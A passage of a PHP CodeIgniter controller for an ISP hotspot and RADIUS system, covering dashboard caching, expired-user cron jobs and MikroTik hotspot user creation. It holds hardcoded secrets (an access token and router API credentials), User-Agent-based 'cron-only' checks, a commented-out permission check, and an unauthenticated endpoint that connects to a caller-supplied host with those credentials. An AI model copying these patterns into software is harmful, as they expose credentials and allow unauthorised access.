    }

    public function refreshNasUserStatusCacheAjax() {
        $this->Network_model->refreshAllUserStatusCache();
        echo json_encode([
            'success' => true,
            'updated' => date('Y-m-d H:i:s')
        ]);
    }

    // Archive old radacct records to radacct_archive (utility endpoint)
    public function archiveRadacct() {
        $this->load->model('Other_model');
        $archived = $this->Other_model->archive_old_radacct();
        echo json_encode(['archived' => $archived, 'status' => 'success']);
    }

    /**
     * Helper to determine ismaster for a given managername
     */
    private function getIsMaster($managername)
    {
        if ($this->session->userdata('name') == $managername && $this->session->userdata('ismaster') !== null) {
            return $this->session->userdata('ismaster');
        }
        $this->load->model('Login_model');
        $masterInfo = $this->Login_model->lisMasterManager($managername);
        return (!empty($masterInfo) && $masterInfo->managercount > 0) ? 1 : 0;
    }

    /**
     * AJAX/CLI: Get sales and paid by month for the last year (dashboard graph)
     */
    public function ajaxSalesAndPaidByMonth()
    {
        $managername = $this->input->get('managername') ?: $this->session->userdata('name');
        $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (getenv('APP_HOSTNAME') ?: 'localhost');
        $domain_prefix = str_replace('.', '_', $domain);
        $cache_key = $domain_prefix . '_dashboardgraph_salesbymonth_' . $managername;
        $this->load->driver('cache', array('adapter' => 'file'));
        $force_refresh = $this->input->get('refresh');
        if ($force_refresh) {
            $data = $this->Reports_model->getSalesByMonthLastYear($this->getIsMaster($managername), $managername);
            $this->cache->save($cache_key, $data, 86400);
        } else {
            $data = $this->cache->get($cache_key);
            if ($data === FALSE) {
                $data = $this->Reports_model->getSalesByMonthLastYear($this->getIsMaster($managername), $managername);
                $this->cache->save($cache_key, $data, 86400);
            }
        }
        echo json_encode($data);
    }

    /**
     * AJAX/CLI: Get online/offline users by hour for last 24h (dashboard graph)
     */
    public function ajaxOnlineOffline24h()
    {
        $managername = $this->input->get('managername') ?: $this->session->userdata('name');
        $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (getenv('APP_HOSTNAME') ?: 'localhost');
        $domain_prefix = str_replace('.', '_', $domain);
        $cache_key = $domain_prefix . '_dashboardgraph_onlineoffline_' . $managername;
        $this->load->driver('cache', array('adapter' => 'file'));
        $force_refresh = $this->input->get('refresh');
        if ($force_refresh) {
            $data = $this->Reports_model->getOnlineOfflineByHourLast24h($this->getIsMaster($managername), $managername);
            $this->cache->save($cache_key, $data, 86400);
        } else {
            $data = $this->cache->get($cache_key);
            if ($data === FALSE) {
                $data = $this->Reports_model->getOnlineOfflineByHourLast24h($this->getIsMaster($managername), $managername);
                $this->cache->save($cache_key, $data, 86400);
            }
        }
        echo json_encode($data);
    }

    /**
     * AJAX/CLI: Get top 5 service plans with price and sales for the last month (dashboard graph)
     */
    public function ajaxTop5ServicePlansLastMonth()
    {
        $managername = $this->input->get('managername') ?: $this->session->userdata('name');
        $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (getenv('APP_HOSTNAME') ?: 'localhost');
        $domain_prefix = str_replace('.', '_', $domain);
        $cache_key = $domain_prefix . '_dashboardgraph_top5plans_' . $managername;
        $this->load->driver('cache', array('adapter' => 'file'));
        $force_refresh = $this->input->get('refresh');
        if ($force_refresh) {
            $data = $this->Reports_model->getTop5ServicePlansLastMonth($this->getIsMaster($managername), $managername);
            $this->cache->save($cache_key, $data, 86400);
        } else {
            $data = $this->cache->get($cache_key);
            if ($data === FALSE) {
                $data = $this->Reports_model->getTop5ServicePlansLastMonth($this->getIsMaster($managername), $managername);
                $this->cache->save($cache_key, $data, 86400);
            }
        }
        echo json_encode($data);
    }

    /**
     * AJAX/CLI: Get dashboard fair use alert (top 5 users by usage last month)
     */
    public function ajaxDashboardFairuseAlert()
    {
        $managername = $this->input->get('managername') ?: $this->session->userdata('name');
        $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (getenv('APP_HOSTNAME') ?: 'localhost');
        $domain_prefix = str_replace('.', '_', $domain);
        $cache_key = $domain_prefix . '_dashboardgraph_fairuse_' . $managername;
        $this->load->driver('cache', array('adapter' => 'file'));
        $force_refresh = $this->input->get('refresh');
        if ($force_refresh) {
            $data = $this->Reports_model->dashboard_fairuse_alert($this->getIsMaster($managername), $managername);
            $this->cache->save($cache_key, $data, 86400);
        } else {
            $data = $this->cache->get($cache_key);
            if ($data === FALSE) {
                $data = $this->Reports_model->dashboard_fairuse_alert($this->getIsMaster($managername), $managername);
                $this->cache->save($cache_key, $data, 86400);
            }
        }
        echo json_encode($data);
    }

    /**
     * CLI/curl: Refresh all dashboard graph caches for all managers (not for dashboard AJAX)
     * Usage: curl http://yourserver/Other/cacheAllDashboardGraphs?token=YOUR_SECRET
     * Or: php index.php Other cacheAllDashboardGraphs token
     *
     * If managername is provided, only refresh for that manager. Otherwise, refresh for all managers in rm_managers.
     */
    public function cacheAllDashboardGraphs($managername = null, $token = null)
    {
        if (!$this->input->is_cli_request() && $this->input->get('token') !== 'C@llAp1N0w') {
            show_404();
            return;
        }
        $this->load->model('Services_model');
        $this->load->driver('cache', array('adapter' => 'file'));
        $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (getenv('APP_HOSTNAME') ?: 'localhost');
        $domain_prefix = str_replace('.', '_', $domain);
        $results = [];
        if (!$this->input->is_cli_request() && $this->input->get('token') === 'C@llAp1N0w' && $this->input->get('managername')) {
            $managernames = [$this->input->get('managername')];
        } else if ($this->input->is_cli_request() && $managername) {
            $managernames = [$managername];
        } else {
            $all = $this->Services_model->getManagers();
            $managernames = [];
            foreach ($all as $mgr) {
                if (isset($mgr->managername) && $mgr->managername !== 'admin') {
                    $managernames[] = $mgr->managername;
                }
            }
        }
        foreach ($managernames as $managername) {
            $ismaster = $this->getIsMaster($managername);
            $cache_key = $domain_prefix . '_dashboardgraph_salesbymonth_' . $managername;
            $data = $this->Reports_model->getSalesByMonthLastYear($ismaster, $managername);
            $this->cache->save($cache_key, $data, 86400);

            $cache_key = $domain_prefix . '_dashboardgraph_onlineoffline_' . $managername;
            $data = $this->Reports_model->getOnlineOfflineByHourLast24h($ismaster, $managername);
            $this->cache->save($cache_key, $data, 3600);

            $cache_key = $domain_prefix . '_dashboardgraph_top5plans_' . $managername;
            $data = $this->Reports_model->getTop5ServicePlansLastMonth($ismaster, $managername);
            $this->cache->save($cache_key, $data, 86400);

            $cache_key = $domain_prefix . '_dashboardgraph_fairuse_' . $managername;
            $data = $this->Reports_model->dashboard_fairuse_alert($ismaster, $managername);
            $this->cache->save($cache_key, $data, 86400);
            $results[$managername] = 'refreshed';
        }
        echo json_encode(['refreshed' => $results, 'count' => count($results)]);
    }

    /**
     * Create and populate temporary tables for user dashboard
     * This function should ONLY be called via cron jobs, not from frontend
     */
    public function createUserDashboardCache() {
        log_message('debug', 'createUserDashboardCache called');
        
        // Check if this is a legitimate cron call
        $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
        $is_cron = (strpos($user_agent, 'curl') !== false || 
                    strpos($user_agent, 'wget') !== false || 
                    empty($user_agent) ||
                    isset($_SERVER['HTTP_X_FORWARDED_FOR']) === false); // No proxy headers
        
        if (!$is_cron) {
            // If not called by cron, return error immediately
            header('Content-Type: application/json');
            echo json_encode(array(
                'status' => 'error',
                'message' => 'This function can only be called via cron jobs',
                'timestamp' => date('Y-m-d H:i:s')
            ));
            return;
        }
        
        // Set execution time limit for large datasets
        set_time_limit(300); // 5 minutes
        
        try {
            // Create temporary tables if they don't exist
            $this->createTempTables();
            
            // Clear existing data
            $this->clearTempTables();
            
            // Populate temporary tables
            $this->populateTempTables();
            
            // Store the refresh timestamp in cache_status table
            //$this->storeRefreshTimestamp();
            
            $response = array(
                'status' => 'success',
                'message' => 'User dashboard cache created successfully',
                'timestamp' => date('Y-m-d H:i:s')
            );
            
        } catch (Exception $e) {
            $response = array(
                'status' => 'error',
                'message' => 'Error creating cache: ' . $e->getMessage(),
                'timestamp' => date('Y-m-d H:i:s')
            );
        }
        
        // Return JSON response
        header('Content-Type: application/json');
        echo json_encode($response);
    }

    /**
     * Create and populate temporary tables for user dashboard (background version)
     * This function can be called from background processes without cron detection
     */
    public function createUserDashboardCacheBackground() {
        log_message('debug', 'createUserDashboardCacheBackground called');
        
        // Set execution time limit for large datasets
        set_time_limit(300); // 5 minutes
        
        // Prevent any output before JSON response
        ob_start();
        
        try {
            // Create temporary tables if they don't exist
            $this->createTempTables();
            
            // Prepare new data before clearing existing data
            $this->prepareNewDashboardData();
            
            // Quick swap: Clear and populate in minimal time
            $this->swapDashboardData();
            
            // Store the refresh timestamp in cache_status table
            //$this->storeRefreshTimestamp();
            
            $response = array(
                'status' => 'success',
                'message' => 'User dashboard cache created successfully',
                'timestamp' => date('Y-m-d H:i:s')
            );
            
        } catch (Exception $e) {
            $response = array(
                'status' => 'error',
                'message' => 'Error creating cache: ' . $e->getMessage(),
                'timestamp' => date('Y-m-d H:i:s')
            );
        }
        
        // Clear any output buffer
        ob_end_clean();
        
        // Return JSON response
        header('Content-Type: application/json');
        echo json_encode($response);
    }

    /**
     * Prepare new dashboard data in memory before clearing existing data
     */
    private function prepareNewDashboardData() {
        log_message('debug', 'Preparing new dashboard data');
        
        // Load the Network model to access data preparation methods
        $this->load->model('Network_model');
        
        // Prepare all data in memory first - convert to proper format for insert_batch
        $this->prepared_overall_stats = $this->formatOverallStatsForInsert($this->Network_model->getOverallDashboardStats());
        $this->prepared_owner_stats = $this->formatOwnerStatsForInsert($this->Network_model->getUserDashboardStats());
        $this->prepared_nas_stats = $this->formatNasStatsForInsert($this->Network_model->getOnlineUsersByNas());
        $this->prepared_recent_activity = $this->formatRecentActivityForInsert($this->Network_model->getRecentActivity());
        
        log_message('debug', 'New dashboard data prepared successfully');
    }

    /**
     * Format overall stats for database insertion
     */
    private function formatOverallStatsForInsert($stats) {
        if (!$stats || !is_object($stats)) {
            return array();
        }
        
        return array(array(
            'total_users' => isset($stats->total_users) ? $stats->total_users : 0,
            'total_online_users' => isset($stats->total_online_users) ? $stats->total_online_users : 0,
            'total_active_users' => isset($stats->total_active_users) ? $stats->total_active_users : 0,
            'total_expired_users' => isset($stats->total_expired_users) ? $stats->total_expired_users : 0,
            'active_online_users' => isset($stats->active_online_users) ? $stats->active_online_users : 0,
            'active_offline_users' => isset($stats->active_offline_users) ? $stats->active_offline_users : 0,
            'expired_online_users' => isset($stats->expired_online_users) ? $stats->expired_online_users : 0,
            'expired_offline_users' => isset($stats->expired_offline_users) ? $stats->expired_offline_users : 0,
            'created_at' => date('Y-m-d H:i:s')
        ));
    }

    /**
     * Format owner stats for database insertion
     */
    private function formatOwnerStatsForInsert($stats) {
        if (!$stats || !is_array($stats)) {
            return array();
        }
        
        $formatted = array();
        foreach ($stats as $stat) {
            $formatted[] = array(
                'owner' => isset($stat['owner']) ? $stat['owner'] : '',
                'total_active' => isset($stat['total_active']) ? $stat['total_active'] : 0,
                'total_expired' => isset($stat['total_expired']) ? $stat['total_expired'] : 0,
                'total_online' => isset($stat['total_online']) ? $stat['total_online'] : 0,
                'total_offline' => isset($stat['total_offline']) ? $stat['total_offline'] : 0,
                'created_at' => date('Y-m-d H:i:s')
            );
        }
        return $formatted;
    }

    /**
     * Format NAS stats for database insertion
     */
    private function formatNasStatsForInsert($stats) {
        if (!$stats || !is_array($stats)) {
            return array();
        }
        
        $formatted = array();
        foreach ($stats as $stat) {
            $formatted[] = array(
                'nasname' => isset($stat->nasname) ? $stat->nasname : '',
                'shortname' => isset($stat->shortname) ? $stat->shortname : '',
                'online_users' => isset($stat->online_users) ? $stat->online_users : 0,
                'active_online_users' => isset($stat->active_online_users) ? $stat->active_online_users : 0,
                'expired_online_users' => isset($stat->expired_online_users) ? $stat->expired_online_users : 0,
                'created_at' => date('Y-m-d H:i:s')
            );
        }
        return $formatted;
    }

    /**
     * Format recent activity for database insertion
     */
    private function formatRecentActivityForInsert($stats) {
        if (!$stats || !is_array($stats)) {
            return array();
        }
        
        $formatted = array();
        foreach ($stats as $stat) {
            $formatted[] = array(
                'username' => isset($stat->username) ? $stat->username : '',
                'firstname' => isset($stat->firstname) ? $stat->firstname : '',
                'lastname' => isset($stat->lastname) ? $stat->lastname : '',
                'owner' => isset($stat->owner) ? $stat->owner : '',
                'nasipaddress' => isset($stat->nasipaddress) ? $stat->nasipaddress : '',
                'nas_shortname' => isset($stat->nas_shortname) ? $stat->nas_shortname : '',
                'status' => isset($stat->status) ? $stat->status : '',
                'acctstarttime' => isset($stat->acctstarttime) ? $stat->acctstarttime : '',
                'acctstoptime' => isset($stat->acctstoptime) ? $stat->acctstoptime : '',
                'acctterminatecause' => isset($stat->acctterminatecause) ? $stat->acctterminatecause : '',
                'created_at' => date('Y-m-d H:i:s')
            );
        }
        return $formatted;
    }

    /**
     * Quick swap: Clear old data and insert new data with minimal downtime
     */
    private function swapDashboardData() {
        log_message('debug', 'Starting quick data swap');
        
        // Start transaction for atomic operation
        $this->db->trans_start();
        
        try {
            // Clear existing data
            $this->clearTempTables();
            
            // Insert prepared data quickly
            $this->insertPreparedData();
            
            // Commit transaction
            $this->db->trans_complete();
            
            if ($this->db->trans_status() === FALSE) {
                // Transaction failed
                $this->db->trans_rollback();
                throw new Exception('Database transaction failed during data swap');
            }
            
            log_message('debug', 'Data swap completed successfully');
            
        } catch (Exception $e) {
            $this->db->trans_rollback();
            log_message('error', 'Data swap failed: ' . $e->getMessage());
            throw $e;
        }
    }

    /**
     * Insert the prepared data into temp tables
     */
    private function insertPreparedData() {
        // Insert overall stats
        if (!empty($this->prepared_overall_stats)) {
            $this->db->insert_batch('temp_dashboard_overall', $this->prepared_overall_stats);
        }
        
        // Insert owner stats
        if (!empty($this->prepared_owner_stats)) {
            $this->db->insert_batch('temp_dashboard_owner', $this->prepared_owner_stats);
        }
        
        // Insert NAS stats
        if (!empty($this->prepared_nas_stats)) {
            $this->db->insert_batch('temp_dashboard_nas', $this->prepared_nas_stats);
        }
        
        // Insert recent activity
        if (!empty($this->prepared_recent_activity)) {
            $this->db->insert_batch('temp_dashboard_activity', $this->prepared_recent_activity);
        }
    }

    /**
     * Disconnect expired users - can be called via cron job
     * This function automatically processes ALL expired users across ALL managers and NAS devices
     */
    public function disconnectExpiredUsersCron() {
        log_message('debug', 'disconnectExpiredUsersCron called');
        set_time_limit(300); // 5 minutes
        
        try {
            $this->load->model('Network_model');
            
            // Disconnect all expired users automatically
            $result = $this->Network_model->disconnectAllExpiredUsersAutomatically();
            
            $response = array(
                'status' => 'success',
                'message' => 'Expired users disconnection completed',
                'result' => $result,
                'timestamp' => date('Y-m-d H:i:s')
            );
            
        } catch (Exception $e) {
            $response = array(
                'status' => 'error',
                'message' => 'Error disconnecting expired users: ' . $e->getMessage(),
                'timestamp' => date('Y-m-d H:i:s')
            );
        }
        
        // Return JSON response
        header('Content-Type: application/json');
        echo json_encode($response);
    }

    /**
     * Trigger cache refresh from frontend (non-blocking)
     * This function initiates the cache refresh process without waiting for completion
     */
    public function triggerCacheRefresh() {
        // Check if user has permission
        //if($this->isAdmin() == FALSE && $this->isManager() == FALSE) {
        //    echo json_encode(array('status' => 'error', 'message' => 'Access denied'));
        //    return;
        //}
        
        // Check if cache refresh is already in progress
        $this->db->select('*');
        $this->db->from('cache_status');
        $this->db->where('status', 'refreshing');
        $this->db->where('updated_at >', date('Y-m-d H:i:s', strtotime('-5 minutes')));
        $query = $this->db->get();
        
        if ($query->num_rows() > 0) {
            echo json_encode(array(
                'status' => 'info',
                'message' => 'Cache refresh is already in progress',
                'timestamp' => date('Y-m-d H:i:s')
            ));
            return;
        }
        
        // Mark cache as refreshing
        $this->db->replace('cache_status', array(
            'status' => 'refreshing',
            'updated_at' => date('Y-m-d H:i:s')
        ));
        
        // Trigger the actual cache refresh in background
        $this->triggerBackgroundCacheRefresh();
        
        echo json_encode(array(
            'status' => 'success',
            'message' => 'Cache refresh initiated in background',
            'timestamp' => date('Y-m-d H:i:s')
        ));
    }

    /**
     * Trigger background cache refresh (called internally)
     */
    private function triggerBackgroundCacheRefresh() {
        // Use exec to run the cache refresh in background
        $command = "curl -s " . base_url('Other/createUserDashboardCacheBackground') . " > /dev/null 2>&1 &";
        exec($command);
        
        log_message('info', 'Background cache refresh triggered');
    }

    /**
     * Check if dashboard data is ready (READ-ONLY check, no refresh triggered)
     */
    public function checkDataStatus() {
        // Check if the temp tables exist and have data
        $tables_exist = $this->db->table_exists('temp_dashboard_overall') && 
                       $this->db->table_exists('temp_dashboard_owner') && 
                       $this->db->table_exists('temp_dashboard_nas') && 
                       $this->db->table_exists('temp_dashboard_activity');
        
        if (!$tables_exist) {
            $response = array(
                'status' => 'not_ready',
                'message' => 'Dashboard data is not available',
                'timestamp' => date('Y-m-d H:i:s')
            );
        } else {
            // Check if tables have data
            $overall_count = $this->db->count_all('temp_dashboard_overall');
            $owner_count = $this->db->count_all('temp_dashboard_owner');
            $nas_count = $this->db->count_all('temp_dashboard_nas');
            $activity_count = $this->db->count_all('temp_dashboard_activity');
            
            // If any table is empty, data is not ready
            if ($overall_count == 0 || $owner_count == 0 || $nas_count == 0 || $activity_count == 0) {
                $response = array(
                    'status' => 'not_ready',
                    'message' => 'Dashboard data is not ready',
                    'timestamp' => date('Y-m-d H:i:s')
                );
            } else {
                // Get the last refresh timestamp from the cache_status table if it exists
                $last_updated = null;
                if ($this->db->table_exists('cache_status')) {
                    $result = $this->db->query("SELECT last_updated FROM cache_status WHERE id = 1");
                    if ($result && $result->num_rows() > 0) {
                        $last_updated = $result->row()->last_updated;
                    }
                }
                
                $response = array(
                    'status' => 'ready',
                    'message' => 'Dashboard data is ready',
                    'timestamp' => $last_updated ? $last_updated : date('Y-m-d H:i:s')
                );
            }
        }
        
        // Return JSON response
        header('Content-Type: application/json');
        echo json_encode($response);
    }
    
    /**
     * Create temporary tables for dashboard data
     */
    private function createTempTables() {
        // Table for overall statistics
        $sql_overall = "CREATE TABLE IF NOT EXISTS temp_dashboard_overall (
            id INT AUTO_INCREMENT PRIMARY KEY,
            total_users INT DEFAULT 0,
            total_active_users INT DEFAULT 0,
            total_expired_users INT DEFAULT 0,
            total_online_users INT DEFAULT 0,
            total_offline_users INT DEFAULT 0,
            active_online_users INT DEFAULT 0,
            active_offline_users INT DEFAULT 0,
            expired_online_users INT DEFAULT 0,
            expired_offline_users INT DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )";
        $this->db->query($sql_overall);
        
        // Table for owner statistics
        $sql_owner = "CREATE TABLE IF NOT EXISTS temp_dashboard_owner (
            id INT AUTO_INCREMENT PRIMARY KEY,
            owner VARCHAR(255),
            total_active INT DEFAULT 0,
            total_expired INT DEFAULT 0,
            total_online INT DEFAULT 0,
            total_offline INT DEFAULT 0,
            active_online INT DEFAULT 0,
            active_offline INT DEFAULT 0,
            expired_online INT DEFAULT 0,
            expired_offline INT DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )";
        $this->db->query($sql_owner);
        
        // Table for NAS statistics
        $sql_nas = "CREATE TABLE IF NOT EXISTS temp_dashboard_nas (
            id INT AUTO_INCREMENT PRIMARY KEY,
            shortname VARCHAR(255),
            nasname VARCHAR(255),
            online_users INT DEFAULT 0,
            active_online_users INT DEFAULT 0,
            expired_online_users INT DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )";
        $this->db->query($sql_nas);
        
        // Table for recent activity
        $sql_activity = "CREATE TABLE IF NOT EXISTS temp_dashboard_activity (
            id INT AUTO_INCREMENT PRIMARY KEY,
            username VARCHAR(255),
            firstname VARCHAR(255),
            lastname VARCHAR(255),
            owner VARCHAR(255),
            acctstarttime DATETIME,
            acctstoptime DATETIME,
            acctterminatecause VARCHAR(255),
            nasipaddress VARCHAR(255),
            nas_shortname VARCHAR(255),
            status VARCHAR(50),
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )";
        $this->db->query($sql_activity);
    }
    
    /**
     * Clear existing data from temporary tables
     */
    private function clearTempTables() {
        $this->db->query("TRUNCATE TABLE temp_dashboard_overall");
        $this->db->query("TRUNCATE TABLE temp_dashboard_owner");
        $this->db->query("TRUNCATE TABLE temp_dashboard_nas");
        $this->db->query("TRUNCATE TABLE temp_dashboard_activity");
    }
    
    /**
     * Populate temporary tables with data
     */
    private function populateTempTables() {
        // Get all managers to populate data for each
        $managers = $this->getAllManagers();
        
        foreach ($managers as $manager) {
            $managername = $manager->managername;
            
            // Get overall statistics
            $overall_stats = $this->Network_model->getOverallDashboardStats($managername);
            if ($overall_stats) {
                $this->db->insert('temp_dashboard_overall', array(
                    'total_users' => $overall_stats->total_users,
                    'total_active_users' => $overall_stats->total_active_users,
                    'total_expired_users' => $overall_stats->total_expired_users,
                    'total_online_users' => $overall_stats->total_online_users,
                    'total_offline_users' => $overall_stats->total_offline_users,
                    'active_online_users' => $overall_stats->active_online_users,
                    'active_offline_users' => $overall_stats->active_offline_users,
                    'expired_online_users' => $overall_stats->expired_online_users,
                    'expired_offline_users' => $overall_stats->expired_offline_users
                ));
            }
            
            // Get owner statistics
            $owner_stats = $this->Network_model->getUserDashboardStats($managername);
            foreach ($owner_stats as $owner) {
                $this->db->insert('temp_dashboard_owner', array(
                    'owner' => $owner['owner'],
                    'total_active' => $owner['total_active'],
                    'total_expired' => $owner['total_expired'],
                    'total_online' => $owner['total_online'],
                    'total_offline' => $owner['total_offline'],
                    'active_online' => $owner['active_online'],
                    'active_offline' => $owner['active_offline'],
                    'expired_online' => $owner['expired_online'],
                    'expired_offline' => $owner['expired_offline']
                ));
            }
            
            // Get NAS statistics
            $nas_stats = $this->Network_model->getOnlineUsersByNas($managername);
            foreach ($nas_stats as $nas) {
                $this->db->insert('temp_dashboard_nas', array(
                    'shortname' => $nas->shortname,
                    'nasname' => $nas->nasname,
                    'online_users' => $nas->online_users,
                    'active_online_users' => $nas->active_online_users,
                    'expired_online_users' => $nas->expired_online_users
                ));
            }
            
            // Get recent activity
            $recent_activity = $this->Network_model->getRecentActivity($managername);
            foreach ($recent_activity as $activity) {
                $this->db->insert('temp_dashboard_activity', array(
                    'username' => $activity->username,
                    'firstname' => $activity->firstname,
                    'lastname' => $activity->lastname,
                    'owner' => $activity->owner,
                    'acctstarttime' => $activity->acctstarttime,
                    'acctstoptime' => $activity->acctstoptime,
                    'acctterminatecause' => $activity->acctterminatecause,
                    'nasipaddress' => $activity->nasipaddress,
                    'nas_shortname' => $activity->nas_shortname,
                    'status' => $activity->status
                ));
            }
        }
    }
    
    /**
     * Get all managers from the system
     */
    private function getAllManagers() {
        $this->db->select('managername');
        $this->db->from('rm_managers');
        $this->db->or_where('managername', 'admin');
        $query = $this->db->get();
        return $query->result();
    }

    /**
     * Cron job to refresh user dashboard cache
     * This can be called via cron job: 0,5,10,15,20,25,30,35,40,45,50,55 * * * * curl http://your-domain/Other/createUserDashboardCache
     */
    public function refreshDashboardCacheCron() {

        log_message('debug', 'refreshDashboardCacheCron called');
        
        // Check if this is a legitimate cron call
        $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
        $is_cron = (strpos($user_agent, 'curl') !== false || 
                    strpos($user_agent, 'wget') !== false || 
                    empty($user_agent));
        
        if (!$is_cron) {
            // If not called by cron, return error
            header('Content-Type: application/json');
            echo json_encode(array(
                'status' => 'error',
                'message' => 'This endpoint is for cron jobs only',
                'timestamp' => date('Y-m-d H:i:s')
            ));
            return;
        }
        
        // Call the cache creation function
        $this->createUserDashboardCache();
    }
    
    /**
     * Store refresh timestamp in cache_status table
     */
    private function storeRefreshTimestamp() {
        // Create cache_status table if it doesn't exist
        $this->db->query("CREATE TABLE IF NOT EXISTS cache_status (
            id INT PRIMARY KEY AUTO_INCREMENT,
            status VARCHAR(50) DEFAULT 'ready',
            is_refreshing TINYINT(1) DEFAULT 0,
            last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
        )");
        
        // Update or insert timestamp with ready status
        $this->db->query("INSERT INTO cache_status (id, status, last_updated) VALUES (1, 'ready', NOW()) 
                         ON DUPLICATE KEY UPDATE status = 'ready', last_updated = NOW()");
        
        log_message('info', 'Dashboard cache refresh completed and timestamp updated');
    }

    /**
     * Test function to check cache status and manually refresh
     * Access via: your-domain/Other/testDashboardCache
     */
    public function testDashboardCache() {
        $this->load->model('Network_model');
        
        $cache_status = array(
            'cache_exists' => $this->Network_model->isCacheFresh(),
            'cache_tables' => array()
        );
        
        // Check if cache tables exist
        $tables = array('temp_dashboard_overall', 'temp_dashboard_owner', 'temp_dashboard_nas', 'temp_dashboard_activity');
        foreach ($tables as $table) {
            $query = $this->db->query("SHOW TABLES LIKE '$table'");
            $cache_status['cache_tables'][$table] = $query->num_rows() > 0;
        }
        
        // Get cache data counts
        if ($cache_status['cache_tables']['temp_dashboard_overall']) {
            $overall_count = $this->db->count_all('temp_dashboard_overall');
            $owner_count = $this->db->count_all('temp_dashboard_owner');
            $nas_count = $this->db->count_all('temp_dashboard_nas');
            $activity_count = $this->db->count_all('temp_dashboard_activity');
            
            $cache_status['data_counts'] = array(
                'overall_records' => $overall_count,
                'owner_records' => $owner_count,
                'nas_records' => $nas_count,
                'activity_records' => $activity_count
            );
        }
        
        // Check if refresh is requested
        if ($this->input->get('refresh') == '1') {
            //$this->createUserDashboardCache();
            //$cache_status['refresh_triggered'] = true;
        }
        
        header('Content-Type: application/json');
        echo json_encode($cache_status);
    }

    function hotspotmobilelogin(){

        $mac = $this->input->post('mac');
        $ip = $this->input->post('ip');
        $linkLogin = $this->input->post('link-login');
        $linkLoginOnly = $this->input->post('link-login-only');
        $identity = $this->input->post('identity');
        $hotspoterror = $this->input->post('error');

        $data['mac'] = $mac;
        $data['ip'] = $ip;
        $data['linkLogin'] = $linkLogin;
        $data['linkLoginOnly'] = $linkLoginOnly;
        $data['hotspoterror'] = $hotspoterror;
        $data['identity'] = $identity;

        //$voucher_owner = $this->Other_model->get_userowner($identity);
        //$mac = "58:6D:8F:97:8B:F1"; // For Testing

        $nasRandomMacSetting = $this->login_model->getSettingInfo($identity, 'CHECK-MAC');
        if(!empty($nasRandomMacSetting)){
            if($nasRandomMacSetting->status == 1){
                preg_match('/('.substr($mac,1,1).')/', '26AE', $matches);

                if(!empty($matches)){
                    $this->load->view("loginhotspoterror", $data);
                }else{
                    $this->load->view("loginhotspot", $data);
                }
            }else{
                $this->load->view("loginhotspot", $data);
            }
        }else{
           $this->load->view("hotspot/loginhotspotmobile", $data);
        }

    }

    /**
     * For Mobile Hotspot Login | UAE
     * AJAX function to add hotspot user via MikroTik API
     * Called from hotspot login page when user enters username
     */
    public function add_hotspot_user_api() {
        
        // Get parameters from AJAX request
        $username = $this->input->post('username');
        $comments = $this->input->post('comments');
        $domain = $this->input->post('domain'); // Domain to resolve to IP
        
        // Validate inputs
        if (empty($username)) {
            echo json_encode([
                'status' => 'error',
                'message' => 'Username and domain are required'
            ]);
            return;
        }

        if(empty($domain)){
            $domain = '192.168.195.101';
        }
        
        // Resolve domain to IP
        $apiHost = gethostbyname($domain);
        
        if (empty($apiHost)) {
            echo json_encode([
                'status' => 'error',
                'message' => 'Could not resolve domain: ' . $domain
            ]);
            return;
        }
        
        // API credentials
        $apiuser = 'mobileapi';
        $apipasswd = '786786786';
        
        // Create user info object
        $userInfo = new stdClass();
        $userInfo->username = $username;
        $userInfo->comments = $comments; // Blank for now as requested
        
        try {
            // Call the existing API function to add hotspot user
            $result = $this->api_addhotspotuser_simple($apiHost, $apiuser, $apipasswd, $userInfo);
            
            echo json_encode($result);
            
        } catch (Exception $e) {
            echo json_encode([
                'status' => 'error',
                'message' => 'API Error: ' . $e->getMessage()
            ]);
        }
    }
    
    /**
     * For Mobile Hotspot Login | UAE
     * Simplified version of api_addhotspotuser for AJAX calls
     * Returns JSON response instead of echoing HTML
     */
    private function api_addhotspotuser_simple($apiHost, $apiuser, $apipasswd, $userInfo, $authmode = 0) {
        
        $API = new RouterosAPI();
        $API->debug = false; // Disable debug for AJAX calls
        
        if ($API->connect($apiHost, $apiuser, $apipasswd)) {
            
            // Check if user already exists
            $API->write('/ip/hotspot/user/print', false);
            $API->write('=.proplist=.id', false);
            $API->write('?name=' . $userInfo->username);
            
            $existingUsers = $API->read();
            
            // If user doesn't exist, create it
            if (empty($existingUsers)) {
                
                // Add new voucher to HotSpot list
                $API->comm("/ip/hotspot/user/add", array(
                    "name"     => $userInfo->username,
                    "password" => '',
                    "comment"  => "Info:" . $userInfo->comments,
                ));
                
                // Get the created user and set status
                $API->write('/ip/hotspot/user/print', false);
                $API->write('=.proplist=.id', false);
                $API->write('?name=' . $userInfo->username);
                $newUser = $API->read();
                
                if (!empty($newUser)) {
                    $newUser = $newUser[0];
                    
                    // Set user status based on auth mode
                    if ($authmode == 3) {
                        $API->comm('/ip/hotspot/user/set', array(
                            '.id' => $newUser['.id'],
                            'disabled' => 'yes'
                        ));
                    } else {
                        $API->comm('/ip/hotspot/user/set', array(
                            '.id' => $newUser['.id'],
                            'disabled' => 'no'
                        ));
                    }
                    
                    $API->disconnect();
                    
                    return [
                        'status' => 'success',
                        'message' => 'User ' . $userInfo->username . ' created successfully in MikroTik',
                        'user_id' => $newUser['.id']
                    ];
                    
                } else {
                    $API->disconnect();
                    return [
                        'status' => 'error',
                        'message' => 'Failed to create user in MikroTik'
                    ];
                }
                
            } else {
                $API->disconnect();
                return [
                    'status' => 'info',
                    'message' => 'User ' . $userInfo->username . ' already exists in MikroTik'
                ];
            }
            
        } else {
            return [
                'status' => 'error',
                'message' => 'Failed to connect to MikroTik API at ' . $apiHost
